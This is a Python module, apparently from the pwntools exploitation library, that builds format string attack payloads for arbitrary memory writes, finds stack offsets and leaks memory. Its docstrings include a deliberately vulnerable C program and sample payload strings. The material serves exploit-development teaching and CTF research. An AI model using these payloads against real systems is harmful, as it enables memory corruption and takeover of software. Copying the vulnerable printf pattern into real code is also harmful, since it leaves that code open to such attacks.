r"""
Provide some tools to exploit format string bug

Examples:

    >>> program = tempfile.mktemp()
    >>> source  = program + ".c"
    >>> write(source, '''
    ... #include <stdio.h>
    ... #include <stdlib.h>
    ... #include <unistd.h>
    ... #include <sys/mman.h>
    ... #define MEMORY_ADDRESS ((void*)0x11111000)
    ... #define MEMORY_SIZE 1024
    ... #define TARGET ((int *) 0x11111110)
    ... int main(int argc, char const *argv[])
    ... {
    ...        char buff[1024];
    ...        void *ptr = NULL;
    ...        int *my_var = TARGET;
    ...        ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
    ...        if(ptr != MEMORY_ADDRESS)
    ...        {
    ...                perror("mmap");
    ...                return EXIT_FAILURE;
    ...        }
    ...        *my_var = 0x41414141;
    ...        write(1, &my_var, sizeof(int *));
    ...        scanf("%s", buff);
    ...        dprintf(2, buff);
    ...        write(1, my_var, sizeof(int));
    ...        return 0;
    ... }''')
    >>> cmdline = ["gcc", source, "-Wno-format-security", "-m32", "-o", program]
    >>> process(cmdline).wait_for_close()
    >>> def exec_fmt(payload):
    ...     p = process(program)
    ...     p.sendline(payload)
    ...     return p.recvall()
    ...
    >>> autofmt = FmtStr(exec_fmt)
    >>> offset = autofmt.offset
    >>> p = process(program, stderr=PIPE)
    >>> addr = unpack(p.recv(4))
    >>> payload = fmtstr_payload(offset, {addr: 0x1337babe})
    >>> p.sendline(payload)
    >>> print hex(unpack(p.recv(4)))
    0x1337babe

Example - Payload generation
^^^^^^^^^^^^^^^^^^^^^^^^^^^^

.. code-block:: python

    # we want to do 3 writes
    writes = {0x08041337:   0xbfffffff,
              0x08041337+4: 0x1337babe,
              0x08041337+8: 0xdeadbeef}

    # the printf() call already writes some bytes
    # for example :
    # strcat(dest, "blabla :", 256);
    # strcat(dest, your_input, 256);
    # printf(dest);
    # Here, numbwritten parameter must be 8
    payload = fmtstr_payload(5, writes, numbwritten=8)

Example - Automated exploitation
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

.. code-block:: python

	# Assume a process that reads a string
	# and gives this string as the first argument
	# of a printf() call
	# It do this indefinitely
	p = process('./vulnerable')

	# Function called in order to send a payload
	def send_payload(payload):
		log.info("payload = %s" % repr(payload))
		p.sendline(payload)
		return p.recv()

	# Create a FmtStr object and give to him the function
	format_string = FmtStr(execute_fmt=send_payload)
	format_string.write(0x0, 0x1337babe) # write 0x1337babe at 0x0
	format_string.write(0x1337babe, 0x0) # write 0x0 at 0x1337babe
	format_string.execute_writes()

"""
from __future__ import division

import copy
import logging
import re
from collections import namedtuple
from intervaltree import IntervalTree, Interval
from operator import itemgetter

from pwnlib.log import getLogger
from pwnlib.memleak import MemLeak
from pwnlib.util.cyclic import *
from pwnlib.util.fiddling import randoms
from pwnlib.util.packing import *

log = getLogger(__name__)

SPECIFIER = {
    1: 'hhn',
    2: 'hn',
    4: 'n',
    8: 'lln',
}

WRITE_SIZE = {
    "byte": 1,
    "short": 2,
    "int": 4,
}

def normalize_writes(writes):
    # make all writes flat
    writes = { address: flat(data) for address, data in writes.items() }

    # merge adjacent writes (and detect overlaps)
    merged = []
    prev_end = -1
    for address, data in sorted(writes.items(), key=itemgetter(0)):
        if address < prev_end:
            raise ValueError("normalize_writes(): data at offset %d overlaps with previous data which ends at offset %d" % (address, prev_end))

        if address == prev_end and merged:
            merged[-1] = (merged[-1][0], merged[-1][1] + data)
        else:
            merged.append((address, data))

        prev_end = address + len(data)

    return merged

# optimization examples (with bytes_written=0)
#
# 00 05 00 00     -> %n%5c%n
# 00 00 05 00 00  -> %n%5c%n
# 00 00 05 05 00 05  -> need overlapping writes if numbwritten > 5

class AtomWrite(namedtuple("AtomWrite", "start data mask")):
    __slots__ = ()
    def __new__(cls, start, data, mask=None):
        if mask is None:
            mask = "\xFF" * len(data)
        return super(AtomWrite, cls).__new__(cls, start, data, mask)

    @property
    def size(self):
        return len(self.data)

    @property
    def bitsize(self):
        return self.size * 8

    @property
    def end(self):
        return self.start + self.size

    def union(self, other):
        assert other.start == self.end, "writes to combine must be continous"
        return AtomWrite(self.start, self.data + other.data, self.mask + other.mask)

    def compute_padding(self, counter):
        mask = unpack(self.mask, "all")
        wanted = unpack(self.data, "all") & mask
        padding = 0
        while True:
            diff = wanted ^ ((counter + padding) & mask)
            if not diff: break
            # this masks the least significant set bit and adds it to padding
            padding += diff & (diff ^ (diff - 1))
        return padding

def make_atoms_simple(address, data):
    return [AtomWrite(address + i, d) for i, d in enumerate(data)]

def apply_atom_merger(func, atoms, maxsize=max(SPECIFIER.keys())):
    out = []
    while atoms:
        # look forward to find atoms to merge with
        accepted = [ atoms[0] ]
        merged_count = 1
        putback = []
        candidate = atoms[0]
        for idx in xrange(1, len(atoms)):
            if candidate.end != atoms[idx].start: break
            if candidate.size > maxsize: break
            candidate = candidate.union(atoms[idx])
            if candidate.size not in SPECIFIER: continue
            merged = func(candidate, atoms[:idx+1])
            if merged:
                accepted, putback = merged
                merged_count = idx+1
        out += accepted
        atoms[0:merged_count] = putback
    return out

def merge_atoms_writesize(atoms, maxsize=1):
    assert maxsize in SPECIFIER, "write size must be supported by printf"

    def merger(candidate, parts):
        return [candidate], []

    return apply_atom_merger(merger, atoms, maxsize=maxsize)

def merge_atoms_small(atoms, sz, numbwritten, overflows=5):
    assert 1 <= overflows, "must allow at least one overflow"
    mincounter = numbwritten
    maxcounter = numbwritten + overflows * (1 << (sz * 8))

    def merger(candidate, parts):
        if mincounter <= unpack(candidate.data, "all") <= maxcounter: return [candidate], []

    return apply_atom_merger(merger, atoms)

def find_nearest_bytes_le(lower, upper, value):
    if not len(lower):
        return ""

    if len(lower) != len(upper):
        diff = len(upper) - len(lower)
        return find_nearest_bytes_le(lower + "\x00"*diff, upper + "\x00"*(-diff), value)

    if len(upper) != len(value):
        diff = len(value) - len(upper)
        return find_nearest_bytes_le(lower, upper + "\x00"*diff, value + "\x00"*(-diff))

    lowbyte = ord(lower[-1])
    upbyte = ord(upper[-1])
    valbyte = ord(value[-1])

    choices = { min(upbyte, lowbyte + 1) }
    if lowbyte <= valbyte <= upbyte:
        choices.add(valbyte)

    best = (-1, None)
    for choice in choices:
        new_lower = "\x00" * (len(lower) - 1) if choice != lowbyte else lower[:-1]
        new_upper = "\xFF" * (len(upper) - 1) if choice != upbyte else upper[:-1]
        result = find_nearest_bytes_le(new_lower, new_upper, value[:-1]) + chr(choice)

        same = [i for i,(a,b) in enumerate(zip(result, value)) if a == b]
        score = (len(same), -max(same) if same else None)
        if score > best[0]:
            best = (score, result)

    return best[1]


def merge_atoms_overlapping(atoms, sz, numbwritten, overflows=5):
    assert 1 <= overflows, "must allow at least one overflow"
    mincounter = pack(numbwritten, 'all')
    maxcounter = pack(numbwritten + overflows * (1 << (sz * 8)), 'all')
    minconstraints = {}

    def merger(candidate, parts):
        approx = find_nearest_bytes_le(mincounter, maxcounter, candidate.data)
        #print(unpack(approx, 'all'), unpack(candidate.data, 'all'), unpack(mincounter, 'all'), unpack(maxcounter, 'all'))
        start = parts[0].start
        mask = ""
        putback = []
        for part in parts:
            first, last = part.start-start, part.end-start
            if approx[first:last] == candidate.data[first:last]:
                mask += part.mask
            else:
                mask += "\0" * len(part.data)
                putback += [part]
        candidate = candidate._replace(mask=mask)
        return [candidate], putback

    return apply_atom_merger(merger, atoms)

def sort_atoms(atoms, numbwritten):
    # find dependencies
    writes = IntervalTree()
    deps = {}
    for atom in atoms:
        deps[atom] = set(i.data for i in writes.search(atom.start, atom.end))
        writes[atom.start:atom.end] = atom

    # sort the atoms respecting their dependencies using a topological sort
    #
    # this is not optimal, I was not able to come up with an efficient optimal algorithm
    #
    # the reason the following is suboptimal is that it may be beneficial
    # to delay some writes even though all their dependencies are
    # already done
    #
    # here's an example where this algorithm will produce suboptimal results:
    #
    # a = Atom(0, "\x17\x00\x00\x00")
    # b = Atom(1, "\x16\x00\x00\x00")  # overwrites parts of a
    # c = Atom(5, "\x21\x01\x00\x00")  # overwrites nothing
    # d = Atom(4, "\x15\x11")          # overwrites parts of b and c
    # e = Atom(2, "\x22\x01")          # overwrites parts of b
    #
    # (writes are to be executed in order a,b,c,d,e)
    #
    # the dependency graph looks like this (a <-- b means b depends on a)
    #
    # a <-- b <-- e
    #       ^
    #       |
    # c <-- d
    #
    # the algorithm will produce [a,c,b,e,d] while the sequence [a,b,c,e,d]
    # would be better since c->e can be done more efficiently (difference is
    # smaller, thus we need less characters for the padding number)
    result = [(numbwritten, None)]
    while deps:
        # get all atoms that are ready (=> have no dependencies)
        ready = [ atom for atom, d in deps.items() if not d & set(deps.keys()) ]

        # insert ready atoms, preserving dependencies
        for atom in ready:
            minidx = max(i for i,(_, a) in enumerate(result) if a in deps[atom] or a is None)
            best = (None, float("inf"))
            for idx in xrange(minidx, len(result)):
                score = atom.compute_padding(result[idx][0])
                if score < best[1]:
                    best = (idx, score)

            newcounter = result[best[0]][0] + best[1]
            result.insert(best[0] + 1, (newcounter, atom))
            deps.pop(atom, None)

    return [x for _, x in result[1:]]


def make_payload_dollar(data_offset, atoms, numbwritten=0, countersize=4):
    data = ""
    fmt = ""

    counter = numbwritten
    for idx, atom in enumerate(atoms):
        sz = len(atom.data)

        # set format string counter to correct value
        padding = atom.compute_padding(counter)
        counter = (counter + padding) % (1 << (countersize * 8))
        if countersize == 32 and counter > 2147483600:
            log.warn("number of written bytes in format string close to 1 << 31. this will likely not work on glibc")
        if padding >= (1 << (countersize*8-1)):
            log.warn("padding is negative, this will not work on glibc")

        # perform write
        if padding:
            fmt += "%" + str(padding) + "c"
        fmt += "%" + str(data_offset + idx) + "$" + SPECIFIER[atom.size]
        data += pack(atom.start)

    return fmt, data

def fmtstr_split(offset, writes, numbwritten=0, write_size='byte'):
    if write_size not in ['byte', 'short', 'int']:
        log.error("write_size must be 'byte', 'short' or 'int'")

    all_atoms = []
    for address, data in normalize_writes(writes):
        atoms = make_atoms_simple(address, data)
        #atoms = merge_atoms_small(atoms, WRITE_SIZE[write_size], numbwritten)
        atoms = merge_atoms_overlapping(atoms, WRITE_SIZE[write_size], numbwritten)
        atoms = sort_atoms(atoms, numbwritten)

        all_atoms += atoms

    return make_payload_dollar(offset, all_atoms, numbwritten=numbwritten)

def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte'):
    r"""fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') -> str

    Makes payload with given parameter.
    It can generate payload for 32 or 64 bits architectures.
    The size of the addr is taken from ``context.bits``

    Arguments:
        offset(int): the first formatter's offset you control
        writes(dict): dict with addr, value ``{addr: value, addr2: value2}``
        numbwritten(int): number of byte already written by the printf function
        write_size(str): must be ``byte``, ``short`` or ``int``. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)
    Returns:
        The payload in order to do needed writes

    Examples:
        >>> context.clear(arch = 'amd64')
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
        '%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00'
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
        '%4919c%6$n%60617c%7$hn%47806c%8$hnaaaaba\x02\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
        '%7$hhn%19c%8$n%36c%9$hhn%131c%10$hhn%4c%11$hhnaa\x07\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        >>> context.clear(arch = 'i386')
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
        '%322419390c%5$na\x00\x00\x00\x00'
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
        '%4919c%7$hn%42887c%8$hna\x02\x00\x00\x00\x00\x00\x00\x00'
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
        '%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'

    """

    fmt = ""
    for iteration in xrange(1000000):
        data_offset = len(fmt) // context.bytes
        fmt, data = fmtstr_split(offset + data_offset, writes, numbwritten=numbwritten, write_size=write_size)
        fmt = fmt + cyclic((-len(fmt)) % context.bytes)

        if len(fmt) == data_offset * context.bytes:
            break
    else:
        raise RuntimeError("this is a bug ... format string building did not converge")

    return fmt + data

class FmtStr(object):
    """
    Provides an automated format string exploitation.

    It takes a function which is called every time the automated
    process want to communicate with the vulnerable process. this
    function takes a parameter with the payload that you have to
    send to the vulnerable process and must return the process
    returns.

    If the `offset` parameter is not given, then try to find the right
    offset by leaking stack data.

    Arguments:
            execute_fmt(function): function to call for communicate with the vulnerable process
            offset(int): the first formatter's offset you control
            padlen(int): size of the pad you want to add before the payload
            numbwritten(int): number of already written bytes

    """

    def __init__(self, execute_fmt, offset = None, padlen = 0, numbwritten = 0):
        """
        Instantiates an object which try to automating exploit the vulnerable process

        Arguments:
            execute_fmt(function): function to call for communicate with the vulnerable process
            offset(int): the first formatter's offset you control
            padlen(int): size of the pad you want to add before the payload
            numbwritten(int): number of already written bytes
        """
        self.execute_fmt = execute_fmt
        self.offset = offset
        self.padlen = padlen
        self.numbwritten = numbwritten


        if self.offset == None:
            self.offset, self.padlen = self.find_offset()
            log.info("Found format string offset: %d", self.offset)

        self.writes = {}
        self.leaker = MemLeak(self._leaker)

    def leak_stack(self, offset, prefix=""):
        leak = self.execute_fmt(prefix+"START%{}$pEND".format(offset))
        try:
            leak = re.findall(r"START(.*)END", leak, re.MULTILINE | re.DOTALL)[0]
            leak = int(leak, 16)
        except ValueError:
            leak = 0
        return leak

    def find_offset(self):
        marker = cyclic(20)
        for off in range(1,1000):
            leak = self.leak_stack(off, marker)
            leak = pack(leak)

            pad = cyclic_find(leak)
            if pad >= 0 and pad < 20:
                return off, pad
        else:
            log.error("Could not find offset to format string on stack")
            return None, None

    def _leaker(self, addr):
        # Hack: elfheaders often start at offset 0 in a page,
        # but we often can't leak addresses containing null bytes,
        # and the page below elfheaders is often not mapped.
        # Thus the solution to this problem is to check if the next 3 bytes are
        # "ELF" and if so we lie and leak "\x7f"
        # unless it is leaked otherwise.
        if addr & 0xfff == 0 and self.leaker._leak(addr+1, 3, False) == "ELF":
            return "\x7f"

        fmtstr = randoms(self.padlen) + pack(addr) + "START%%%d$sEND" % self.offset

        leak = self.execute_fmt(fmtstr)
        leak = re.findall(r"START(.*)END", leak, re.MULTILINE | re.DOTALL)[0]

        leak += "\x00"

        return leak

    def execute_writes(self):
        """execute_writes() -> None

        Makes payload and send it to the vulnerable process

        Returns:
            None

        """
        fmtstr = randoms(self.padlen)
        fmtstr += fmtstr_payload(self.offset, self.writes, numbwritten=self.padlen, write_size='byte')
        self.execute_fmt(fmtstr)
        self.writes = {}

    def write(self, addr, data):
        r"""write(addr, data) -> None

        In order to tell : I want to write ``data`` at ``addr``.

        Arguments:
            addr(int): the address where you want to write
            data(int): the data that you want to write ``addr``

        Returns:
            None

        Examples:

            >>> def send_fmt_payload(payload):
            ...     print repr(payload)
            ...
            >>> f = FmtStr(send_fmt_payload, offset=5)
            >>> f.write(0x08040506, 0x1337babe)
            >>> f.execute_writes()
            '%19c%16$hhn%36c%17$hhn%131c%18$hhn%4c%19$hhn\t\x05\x04\x08\x08\x05\x04\x08\x07\x05\x04\x08\x06\x05\x04\x08'

        """
        self.writes[addr] = data
